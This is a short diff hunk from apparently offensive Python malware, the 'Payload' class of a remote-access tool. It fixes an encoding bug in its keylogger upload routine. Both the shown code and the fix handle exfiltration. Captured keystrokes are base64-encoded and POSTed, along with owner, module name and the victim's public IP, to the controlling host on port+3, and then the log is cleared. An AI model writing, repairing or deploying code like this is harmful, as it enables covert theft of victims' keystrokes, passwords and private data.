@@ -1046,7 +1046,7 @@ class Payload():
                 return locals()['status']()
             elif 'upload' in mode:
                 host, port = self.connection.getpeername()
-                data = base64.b64encode(globals()['keylogger'].logs.getvalue())
+                data = base64.b64encode(globals()['keylogger'].logs.getvalue().encode('utf-8'))
                 json_data = {'data': str(data), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('public_ip')}
                 globals()['post']('http://{}:{}'.format(host, port + 3), json=json_data)
                 globals()['keylogger'].logs.reset()
